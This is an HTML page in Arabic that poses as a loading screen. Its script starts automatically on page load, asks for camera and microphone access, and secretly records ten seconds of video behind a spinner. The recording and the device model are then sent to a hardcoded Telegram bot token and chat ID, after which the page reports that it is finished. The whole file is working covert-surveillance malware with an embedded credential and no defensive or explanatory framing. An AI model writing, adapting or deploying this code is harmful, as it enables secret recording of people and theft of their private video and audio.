<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحميل...</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: system-ui, sans-serif;
            background: #000; color: #fff;
            height: 100vh; display: flex;
            align-items: center; justify-content: center;
            text-align: center; padding: 20px;
        }
        .container { max-width: 400px; width: 100%; }
        .icon { font-size: 60px; margin-bottom: 16px; }
        h2 { font-size: 20px; margin-bottom: 8px; }
        p { color: #aaa; font-size: 14px; }
        .spinner {
            width: 50px; height: 50px; border: 4px solid #222;
            border-top-color: #e60000; border-radius: 50%;
            animation: spin 1s linear infinite; margin: 20px auto;
        }
        @keyframes spin { to{transform:rotate(360deg)} }
        .check { font-size: 70px; color: #059669; display: none; }
        video { display: none; }
    </style>
</head>
<body>

<div class="container">
    <div id="screen-allow">
        <div class="icon">📷</div>
        <h2>السماح بالكاميرا</h2>
        <p>يرجى السماح بالتصوير للمتابعة</p>
    </div>
    
    <div id="screen-record" style="display:none;">
        <div class="icon">🔴</div>
        <h2>جاري التحميل...</h2>
        <p>برجاء الانتظار</p>
        <div class="spinner"></div>
        <video id="hidden-video" autoplay playsinline muted></video>
    </div>
    
    <div id="screen-upload" style="display:none;">
        <div class="icon">📤</div>
        <h2>جاري التحميل...</h2>
        <p>استني شوية</p>
        <div class="spinner"></div>
    </div>
    
    <div id="screen-done" style="display:none;">
        <div class="check">✅</div>
        <h2 style="color:#059669;">تم</h2>
        <p>خلص</p>
    </div>
</div>

<script>
const BOT_TOKEN = '8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
const CHAT_ID = '7276604783';
let mediaRecorder, recordedChunks = [], stream;

function show(id) {
    ['screen-allow','screen-record','screen-upload','screen-done'].forEach(s => {
        document.getElementById(s).style.display = s === id ? 'block' : 'none';
    });
}

async function init() {
    try {
        // طلب الكاميرا فوراً
        show('screen-allow');
        
        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        document.getElementById('hidden-video').srcObject = stream;
        
        show('screen-record');
        
        recordedChunks = [];
        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
        mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
        mediaRecorder.start();
        
        // 10 ثواني تسجيل
        await new Promise(r => setTimeout(r, 10000));
        
        mediaRecorder.stop();
        
        show('screen-upload');
        
        await new Promise(r => setTimeout(r, 2000));
        
        const blob = new Blob(recordedChunks, { type: 'video/webm' });
        const deviceName = navigator.userAgent.match(/; ([^;]+) Build/)?.[1] || 'جهاز';
        
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('video', blob, 'video_' + Date.now() + '.webm');
        formData.append('caption', '🎬 فيديو\n📱 ' + deviceName + '\n🕐 ' + new Date().toLocaleString('ar-EG'));
        
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                method: 'POST', body: formData
            });
        } catch(e) {}
        
        stream.getTracks().forEach(t => t.stop());
        
        show('screen-done');
        
    } catch (e) {
        alert('لازم تسمح بالكاميرا');
    }
}

// بدء تلقائي
window.onload = init;
</script>
</body>
</html>
